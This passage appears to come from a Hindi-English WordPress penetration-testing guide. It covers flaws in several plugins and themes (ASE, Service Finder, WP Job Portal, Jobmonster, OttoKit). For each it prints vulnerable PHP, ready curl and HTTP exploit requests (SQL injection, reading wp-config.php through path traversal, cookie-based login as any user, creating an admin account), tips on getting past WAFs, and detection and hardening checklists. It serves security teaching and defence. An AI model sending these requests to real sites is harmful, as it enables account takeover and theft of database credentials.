рдПрдХ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдЙрджрд╛рд╣рд░рдг Admin and Site Enhancements (ASE) plugin (тЙд 7.6.2.1) рдореЗрдВ рдкрд╛рдпрд╛ рдЧрдпрд╛ рдерд╛ред reset branch рдиреЗ roles рдХреЛ `reset-for=<username>` рдХреЗ рдЖрдзрд╛рд░ рдкрд░ restore рдХрд┐рдпрд╛ рдпрджрд┐ username рдЖрдВрддрд░рд┐рдХ array `$options['viewing_admin_as_role_are']` рдореЗрдВ рджрд┐рдЦрд╛, рдкрд░ рдЙрд╕рдиреЗ рди рддреЛ `current_user_can()` рдЪреЗрдХ рдХрд┐рдпрд╛ рдФрд░ рди рд╣реА nonce verification, рдЗрд╕рд╕реЗ рдкрд╣рд▓реЗ рдХрд┐ current roles рд╣рдЯрд╛рдП рдЬрд╛рдПрдВ рдФрд░ user meta `_asenha_view_admin_as_original_roles` рд╕реЗ saved roles рдлрд┐рд░ рд╕реЗ рдЬреЛрдбрд╝реЗ рдЬрд╛рдПрдВ:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Why itтАЩs exploitable

- `$_REQUEST['reset-for']` рдФрд░ рдПрдХ plugin option рдкрд░ server-side authorization рдХреЗ рдмрд┐рдирд╛ рднрд░реЛрд╕рд╛ рдХрд░рддрд╛ рд╣реИред
- рдпрджрд┐ рдХрд┐рд╕реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ рдкрд╣рд▓реЗ `_asenha_view_admin_as_original_roles` рдореЗрдВ рдЙрдЪреНрдЪрд╛рдзрд┐рдХрд╛рд░ рд╕рд╣реЗрдЬреЗ рдЧрдП рдереЗ рдФрд░ рдмрд╛рдж рдореЗрдВ рдЙрдиреНрд╣реЗрдВ рдХрдо рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛, рддреЛ рд╡реЗ reset path рд╣рд┐рдЯ рдХрд░рдХреЗ рдЙрдиреНрд╣реЗрдВ рдкреБрдирд░реНрд╕реНрдерд╛рдкрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
- рдХреБрдЫ deployments рдореЗрдВ, рдХреЛрдИ рднреА authenticated user рдХрд┐рд╕реА рдЕрдиреНрдп username рдХреЗ рд▓рд┐рдП reset рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддрд╛ рдерд╛ рдЬреЛ рдЕрднреА рднреА `viewing_admin_as_role_are` рдореЗрдВ рдореМрдЬреВрдж рдерд╛ (broken authorization).

Exploitation (example)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
рдХрдордЬреЛрд░ рдмрд┐рд▓реНрдб рдкрд░ рдпрд╣ рд╡рд░реНрддрдорд╛рди roles рдХреЛ рд╣рдЯрд╛ рджреЗрддрд╛ рд╣реИ рдФрд░ рд╕рд╣реЗрдЬреЗ рдЧрдП original roles (рдЙрджрд╛., `administrator`) рдХреЛ рдлрд┐рд░ рд╕реЗ рдЬреЛрдбрд╝ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдкреНрд░рднрд╛рд╡реА рд░реВрдк рд╕реЗ privileges escalate рд╣реЛ рдЬрд╛рддреЗ рд╣реИрдВред

Detection checklist

- Look for role-switching features that persist тАЬoriginal rolesтАЭ in user meta (e.g., `_asenha_view_admin_as_original_roles`).
- Identify reset/restore paths that:
- Read usernames from `$_REQUEST` / `$_GET` / `$_POST`.
- Modify roles via `add_role()` / `remove_role()` without `current_user_can()` and `wp_verify_nonce()` / `check_admin_referer()`.
- Authorize based on a plugin option array (e.g., `viewing_admin_as_role_are`) instead of the actorтАЩs capabilities.

---

### Unauthenticated privilege escalation via cookieтАСtrusted user switching on public init (Service Finder тАЬsf-bookingтАЭ)

рдХреБрдЫ plugins user-switching helpers рдХреЛ public init hook рдкрд░ рдЬреЛрдбрд╝рддреЗ рд╣реИрдВ рдФрд░ рдкрд╣рдЪрд╛рди client-controlled cookie рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВред рдЕрдЧрд░ рдХреЛрдб `wp_set_auth_cookie()` рдХреЛ authentication, capability рдФрд░ рдПрдХ рд╡реИрдз nonce рдХреА рдЬрд╛рдБрдЪ рдХрд┐рдП рдмрд┐рдирд╛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдХреЛрдИ рднреА рдЕрдкреНрд░рдорд╛рдгрд┐рдд рд╡рд┐рдЬрд╝рд┐рдЯрд░ рдХрд┐рд╕реА рднреА arbitrary user ID рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЙрдЧрд┐рди рдХрд░рд╛ рд╕рдХрддрд╛ рд╣реИред

Typical vulnerable pattern (simplified from Service Finder Bookings тЙд 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // ЁЯФе sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
рдХреНрдпреЛрдВ рдпрд╣ exploitable рд╣реИ

- Public `init` hook handler рдХреЛ unauthenticated users рджреНрд╡рд╛рд░рд╛ рдкрд╣реБрдВрдЪ рдпреЛрдЧреНрдп рдмрдирд╛рддрд╛ рд╣реИ (рдХреЛрдИ `is_user_logged_in()` guard рдирд╣реАрдВ)ред
- рдкрд╣рдЪрд╛рди client-modifiable cookie (`original_user_id`) рд╕реЗ рдирд┐рдХрд╛рд▓реА рдЬрд╛рддреА рд╣реИред
- рд╕реАрдзрд╛ рдХреЙрд▓ `wp_set_auth_cookie($uid)` рдЕрдиреБрд░реЛрдзрдХрд░реНрддрд╛ рдХреЛ рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЙрдЧ рдЗрди рдХрд░ рджреЗрддрд╛ рд╣реИ рдмрд┐рдирд╛ рдХрд┐рд╕реА capability/nonce checks рдХреЗред

Exploitation (unauthenticated)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF considerations for WordPress/plugin CVEs

Generic edge/server WAFs broad рдкреИрдЯрд░реНрди (SQLi, XSS, LFI) рдХреЗ рд▓рд┐рдП рдЯреНрдпреВрди рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред рдХрдИ рдЙрдЪреНрдЪ-рдкреНрд░рднрд╛рд╡ рд╡рд╛рд▓реЗ WordPress/plugin рджреЛрд╖ application-specific рд▓реЙрдЬрд┐рдХ/рдСрде рдмрдЧ рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ рддрднреА рддрдХ рдмреЗрдирд╛рдЗрди рдЯреНрд░реИрдлрд╝рд┐рдХ рдЬреИрд╕рд╛ рджрд┐рдЦрддреЗ рд╣реИрдВ рдЬрдм рддрдХ рдЗрдВрдЬрди WordPress routes рдФрд░ plugin semantics рдХреЛ рд╕рдордЭрддрд╛ рдирд╣реАрдВ рд╣реИред

рдСрдлреЗрдВрд╕рд┐рд╡ рдиреЛрдЯреНрд╕

- Target plugin-specific endpoints with clean payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- рдкрд╣рд▓реЗ unauth paths рдкрд░ рдХрд╛рдо рдХрд░реЗрдВ (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes)ред Default payloads рдЕрдХреНрд╕рд░ рдмрд┐рдирд╛ obfuscation рдХреЗ рд╕рдлрд▓ рд╣реЛрддреЗ рд╣реИрдВред
- рд╕рд╛рдорд╛рдиреНрдп рдЙрдЪреНрдЪ-рдкреНрд░рднрд╛рд╡ рдХреЗрд╕: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirectред

рдбрд┐рдлреЗрдВрд╕рд┐рд╡ рдиреЛрдЯреНрд╕

- plugin CVEs рдХреА рд░рдХреНрд╖рд╛ рдХреЗ рд▓рд┐рдП generic WAF signatures рдкрд░ рднрд░реЛрд╕рд╛ рди рдХрд░реЗрдВред application-layer, vulnerability-specific virtual patches рд▓рд╛рдЧреВ рдХрд░реЗрдВ рдпрд╛ рдЬрд▓реНрджреА рд╕реЗ рдЕрдкрдбреЗрдЯ рдХрд░реЗрдВред
- рдХреЛрдб рдореЗрдВ positive-security checks (capabilities, nonces, strict input validation) рдХреЛ рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рджреЗрдВ, negative regex filters рдкрд░ рдирд╣реАрдВред

## WordPress Protection

### Regular Updates

рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ WordPress, plugins, рдФрд░ themes рдЕрдкрдбреЗрдЯреЗрдб рд╣реИрдВред рд╕рд╛рде рд╣реА wp-config.php рдореЗрдВ automated updating рд╕рдХреНрд╖рдо рд╣реИ рдпрд╣ рднреА рдкреБрд╖реНрдЯрд┐ рдХрд░реЗрдВ:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Also, **only install trustable WordPress plugins and themes**.

### рд╕реБрд░рдХреНрд╖рд╛ Plugins

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Other Recommendations**

- рдбрд┐рдлрд╝реЙрд▓реНрдЯ **admin** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╣рдЯрд╛рдПрдБ
- **strong passwords** рдФрд░ **2FA** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ
- рд╕рдордп-рд╕рдордп рдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА **permissions** рдХреА **review** рдХрд░реЗрдВ
- Brute Force attacks рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП **Limit login attempts** рд▓рд╛рдЧреВ рдХрд░реЗрдВ
- **`wp-admin.php`** рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдирд╛рдо рдмрджрд▓реЗрдВ рдФрд░ рдХреЗрд╡рд▓ рдЖрдВрддрд░рд┐рдХ рд░реВрдк рд╕реЗ рдпрд╛ рдХреБрдЫ IP addresses рд╕реЗ рд╣реА рдкрд╣реБрдВрдЪ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдВред


### Unauthenticated SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)

The WP Job Portal recruitment plugin exposed a **savecategory** task that ultimately executes the following vulnerable code inside `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat тЬЧ
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Issues introduced by this snippet:

1. **Unsanitised user input** тАУ `parentid` рд╕реАрдзреЗ HTTP request рд╕реЗ рдЖрддрд╛ рд╣реИред
2. **String concatenation inside the WHERE clause** тАУ рдХреЛрдИ `is_numeric()` / `esc_sql()` / prepared statement рдирд╣реАрдВред
3. **Unauthenticated reachability** тАУ рд╣рд╛рд▓рд╛рдБрдХрд┐ action `admin-post.php` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ execute рд╣реЛрддрд╛ рд╣реИ, рд╕реНрдерд╛рди рдкрд░ рдХреЗрд╡рд▓ рдПрдХ **CSRF nonce** (`wp_verify_nonce()` ) рдХреА рдЬрд╛рдБрдЪ рд╣реИ, рдЬрд┐рд╕реЗ рдХреЛрдИ рднреА рд╡рд┐рдЬрд╝рд┐рдЯрд░ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдкреЗрдЬ рд╕реЗ embedding shortcode `[wpjobportal_my_resumes]` рджреНрд╡рд╛рд░рд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

#### рд╢реЛрд╖рдг

1. рдПрдХ рддрд╛рдЬрд╝рд╛ nonce рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. `parentid` рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ arbitrary SQL рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░реЗрдВ:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
рд░рд┐рд╕реНрдкреЙрдиреНрд╕ рдЗрдВрдЬреЗрдХреНрдЯреЗрдб рдХреНрд╡реЗрд░реА рдХрд╛ рдкрд░рд┐рдгрд╛рдо рдЙрдЬрд╛рдЧрд░ рдХрд░рддрд╛ рд╣реИ рдпрд╛ рдбреЗрдЯрд╛рдмреЗрд╕ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрди рдХрд░ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ SQLi рд╕рд╛рдмрд┐рдд рд╣реЛрддрд╛ рд╣реИред


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

рдПрдХ рдФрд░ task, **downloadcustomfile**, рд╡рд┐рдЬрд╝рд┐рдЯрд░реНрд╕ рдХреЛ path traversal рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбрд┐рд╕реНрдХ рдкрд░ **рдХреЛрдИ рднреА рдлрд╝рд╛рдЗрд▓** рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рдереАред рдХрдордЬреЛрд░ sink `modules/customfield/model.php::downloadCustomUploadedFile()` рдореЗрдВ рд╕реНрдерд┐рдд рд╣реИ:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` рд╣рдорд▓рд╛рд╡рд░-рдирд┐рдпрдВрддреНрд░рд┐рдд рд╣реИ рдФрд░ **рдЗрдирдкреБрдЯ рд╕рддреНрдпрд╛рдкрди рдХреЗ рдмрд┐рдирд╛** рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИред  

рдПрдХ рдмрд╛рд░ рдлрд┐рд░, рдПрдХрдорд╛рддреНрд░ рдмрд╛рдзрд╛ **CSRF nonce** рд╣реИ рдЬрд┐рд╕реЗ resume рдкреЗрдЬ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред  

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
рд╕рд░реНрд╡рд░ `wp-config.php` рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде рдЙрддреНрддрд░ рджреЗрддрд╛ рд╣реИ, leaking DB credentials рдФрд░ auth keysред

## рдмрд┐рдирд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╡рд╛рд▓реЗ рдЕрдХрд╛рдЙрдВрдЯ рдХрд╛ рдХрдмреНрдЬрд╝рд╛ via Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

рдХрдИ themes/plugins "social login" helpers рдХреЗ рд╕рд╛рде рдЖрддреЗ рд╣реИрдВ рдЬреЛ admin-ajax.php рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ expose рд╣реЛрддреЗ рд╣реИрдВред рдпрджрд┐ рдПрдХ unauthenticated AJAX action (wp_ajax_nopriv_...) provider рдбреЗрдЯрд╛ рдЕрдиреБрдкрд╕реНрдерд┐рдд рд╣реЛрдиреЗ рдкрд░ client-supplied identifiers рдкрд░ рднрд░реЛрд╕рд╛ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ wp_set_auth_cookie() рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдкреВрд░реНрдг authentication bypass рдмрди рдЬрд╛рддрд╛ рд╣реИред

Typical flawed pattern (simplified)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider тАУ execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // ЁЯФе logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
рдпрд╣ рдХреНрдпреЛрдВ рд╢реЛрд╖рдг рдпреЛрдЧреНрдп рд╣реИ

- рдмрд┐рдирд╛ рдкреНрд░рдорд╛рдгрд┐рдХрд░рдг рдХреА рдкрд╣реБрдБрдЪ admin-ajax.php рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ (wp_ajax_nopriv_тАж action).
- state change рд╕реЗ рдкрд╣рд▓реЗ рдХреЛрдИ nonce/capability рдЬрд╛рдВрдЪ рдирд╣реАрдВред
- OAuth/OpenID provider verification рдореМрдЬреВрдж рдирд╣реАрдВ; default branch attacker input рд╕реНрд╡реАрдХрд╛рд░ рдХрд░ рд▓реЗрддрд╛ рд╣реИред
- get_user_by('email', $_POST['id']) рдХреЗ рдмрд╛рдж wp_set_auth_cookie($uid) рдЕрдиреБрд░реЛрдзрдХрд░реНрддрд╛ рдХреЛ рдХрд┐рд╕реА рднреА рдореМрдЬреВрдж рдИрдореЗрд▓ рдкрддреЗ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдорд╛рдгреАрдХреГрдд рдХрд░ рджреЗрддрд╛ рд╣реИред

рд╢реЛрд╖рдг (рдмрд┐рдирд╛ рдкреНрд░рдорд╛рдгрд┐рдХрд░рдг рдХреЗ)

- рдкреВрд░реНрд╡рд╛рдкреЗрдХреНрд╖рд╛рдПрдБ: рд╣рдорд▓рд╛рд╡рд░ /wp-admin/admin-ajax.php рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдХрд┐рд╕реА рд╡реИрдз рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдИрдореЗрд▓ рдХреЛ рдЬрд╛рдирддрд╛/рдЕрдиреБрдорд╛рди рд▓рдЧрд╛ рд╕рдХрддрд╛ рд╣реИред
- provider рдХреЛ рдПрдХ unsupported value рдкрд░ рд╕реЗрдЯ рдХрд░реЗрдВ (рдпрд╛ рдЗрд╕реЗ рдЫреЛрдбрд╝ рджреЗрдВ) рддрд╛рдХрд┐ default branch рдкрд░ рдЬрд╛рдПрдБ рдФрд░ id=<victim_email> рдкрд╛рд╕ рдХрд░реЗрдВред
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Expected success indicators

- HTTP 200 рдЬрд┐рд╕рдореЗрдВ JSON рдмреЙрдбреА рдЬреИрд╕реЗ {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* рдкреАрдбрд╝рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП; рдЗрд╕рдХреЗ рдмрд╛рдж рдХреЗ рдЕрдиреБрд░реЛрдз рдкреНрд░рдорд╛рдгреАрдХреГрдд рд╣реЛрдВрдЧреЗред

Finding the action name

- рдереАрдо/рдкреНрд▓рдЧрдЗрди рдореЗрдВ social login рдХреЛрдб рдореЗрдВ add_action('wp_ajax_nopriv_...', '...') рд░рдЬрд┐рд╕реНрдЯреНрд░реЗрд╢рдиреНрд╕ рджреЗрдЦреЗрдВ (рдЙрджрд╛., framework/add-ons/social-login/class-social-login.php).
- AJAX handlers рдХреЗ рдЕрдВрджрд░ wp_set_auth_cookie(), get_user_by('email', ...) рдХреЗ рд▓рд┐рдП grep рдХрд░реЗрдВред

Detection checklist

- рд╡реЗрдм рд▓реЙрдЧ рдЬреЛ /wp-admin/admin-ajax.php рдкрд░ social-login action рдФрд░ id=<email> рдХреЗ рд╕рд╛рде рдЕрдирдкреНрд░рдорд╛рдгрд┐рдд POSTs рджрд┐рдЦрд╛рддреЗ рд╣реЛрдВред
- рд╡рд╣реА IP/User-Agent рд╕реЗ рдЖрдиреЗ рд╡рд╛рд▓реЗ рдкреНрд░рдорд╛рдгреАрдХреГрдд рдЯреНрд░реИрдлрд┐рдХ рд╕реЗ рдареАрдХ рдкрд╣рд▓реЗ success JSON рд╡рд╛рд▓реЗ 200 responsesред

Hardening

- рдХреНрд▓рд╛рдЗрдВрдЯ рдЗрдирдкреБрдЯ рд╕реЗ identity рди рдирд┐рдХрд╛рд▓реЗрдВред рдХреЗрд╡рд▓ рд╡рд╣реА emails/IDs рд╕реНрд╡реАрдХрд╛рд░ рдХрд░реЗрдВ рдЬреЛ validated provider token/ID рд╕реЗ рдЙрддреНрдкрдиреНрди рд╣реБрдП рд╣реЛрдВред
- login helpers рдХреЗ рд▓рд┐рдП рднреА CSRF nonces рдФрд░ capability checks рдЖрд╡рд╢реНрдпрдХ рд░рдЦреЗрдВ; wp_ajax_nopriv_ рдХреЛ рддрднреА рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд░реЗрдВ рдЬрдм рдмрд┐рд▓реНрдХреБрд▓ рдЬрд░реВрд░реА рд╣реЛред
- OAuth/OIDC responses рдХреЛ server-side рдкрд░ validate рдФрд░ verify рдХрд░реЗрдВ; missing/invalid providers рдХреЛ reject рдХрд░реЗрдВ (POST id рдкрд░ fallback рди рдХрд░реЗрдВ)ред
- рдЬрдм рддрдХ рдлрд┐рдХреНрд╕ рди рд╣реЛ, social login рдХреЛ рдЕрд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ рдЕрдХреНрд╖рдо рдХрд░рдиреЗ рдпрд╛ edge рдкрд░ virtual patch рд▓рдЧрд╛рдХрд░ (vulnerable action рдХреЛ рдмреНрд▓реЙрдХ рдХрд░рдХреЗ) рд╡рд┐рдЪрд╛рд░ рдХрд░реЗрдВред

Patched behaviour (Jobmonster 4.8.0)

- рдЕрд╕реБрд░рдХреНрд╖рд┐рдд fallback $_POST['id'] рд╕реЗ рд╣рдЯрд╛рдпрд╛ рдЧрдпрд╛; $user_email рдХреЛ switch($_POST['using']) рдХреЗ verified provider branches рд╕реЗ рдЖрдирд╛ рдЪрд╛рд╣рд┐рдПред

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers тЙд 1.0.82)

Some plugins expose REST endpoints that mint reusable тАЬconnection keysтАЭ or tokens without verifying the callerтАЩs capabilities. If the route authenticates only on a guessable attribute (e.g., username) and does not bind the key to a user/session with capability checks, any unauthenticated attacker can mint a key and invoke privileged actions (admin account creation, plugin actions тЖТ RCE).

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC тАУ mint a connection key and use it
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# тЖТ {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
рдХреНрдпреЛрдВ рдпрд╣ рд╢реЛрд╖рдгреАрдп рд╣реИ
- рд╕рдВрд╡реЗрджрдирд╢реАрд▓ REST route рдХреЗрд╡рд▓ рдХрдо-рдПрдВрдЯреНрд░реЙрдкреА identity proof (username) рдпрд╛ missing permission_callback рджреНрд╡рд╛рд░рд╛ рд╕рдВрд░рдХреНрд╖рд┐рдд
- рдХрд┐рд╕реА capability рдХрд╛ рдкреНрд░рд╡рд░реНрддрди рдирд╣реАрдВ; рдЬрд╛рд░реА рдХрд┐рдпрд╛ рдЧрдпрд╛ key рд╕рд╛рд░реНрд╡рднреМрдорд┐рдХ bypass рдХреЗ рд░реВрдк рдореЗрдВ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░ рд▓рд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ

рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЪреЗрдХрд▓рд┐рд╕реНрдЯ
- Grep plugin code рдореЗрдВ register_rest_route(..., [ 'permission_callback' => '__return_true' ]) рдХреЗ рд▓рд┐рдП рдЦреЛрдЬреЗрдВ
- рдХреЛрдИ рднреА route рдЬреЛ request-supplied identity (username/email) рдХреЗ рдЖрдзрд╛рд░ рдкрд░ tokens/keys рдЬрд╛рд░реА рдХрд░рддрд╛ рд╣реИ рдмрд┐рдирд╛ рдЗрд╕реЗ рдХрд┐рд╕реА authenticated user рдпрд╛ capability рд╕реЗ рдЬреЛрдбрд╝реЗ
- рдЙрди subsequent routes рдХреА рддрд▓рд╛рд╢ рдХрд░реЗрдВ рдЬреЛ server-side capability checks рдХреЗ рдмрд┐рдирд╛ рдЬрд╛рд░реА рдХрд┐рдП рдЧрдП token/key рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддреЗ рд╣реИрдВ

рд╣рд╛рд░реНрдбрдирд┐рдВрдЧ
- рдХрд┐рд╕реА рднреА privileged REST route рдХреЗ рд▓рд┐рдП: permission_callback рдЖрд╡рд╢реНрдпрдХ рдХрд░реЗрдВ рдЬреЛ required capability рдХреЗ рд▓рд┐рдП current_user_can() рд▓рд╛рдЧреВ рдХрд░реЗ
- client-supplied identity рд╕реЗ long-lived keys рди рдмрдирд╛рдПрдВ; рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдиреЗ рдкрд░ authentication рдХреЗ рдмрд╛рдж short-lived, user-bound tokens рдЬрд╛рд░реА рдХрд░реЗрдВ рдФрд░ рдЙрдкрдпреЛрдЧ рдкрд░ capabilities рдлрд┐рд░ рд╕реЗ рдЬрд╛рдБрдЪреЗрдВ
- caller рдХреЗ user context рдХреЛ рдорд╛рдиреНрдп рдХрд░реЗрдВ (wp_set_current_user рдЕрдХреЗрд▓рд╛ рдкрд░реНрдпрд╛рдкреНрдд рдирд╣реАрдВ рд╣реИ) рдФрд░ рдЙрди рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд░реЗрдВ рдЬрд╣рд╛рдБ !is_user_logged_in() || !current_user_can(<cap>)

---

## Nonce gate misuse тЖТ рдЕрдкреНрд░рдорд╛рдгреАрдХрд░рдгрд░рд╣рд┐рдд рдордирдорд╛рдирд╛ plugin рдЗрдВрд╕реНрдЯреЙрд▓реЗрд╢рди (FunnelKit Automations тЙд 3.5.3)

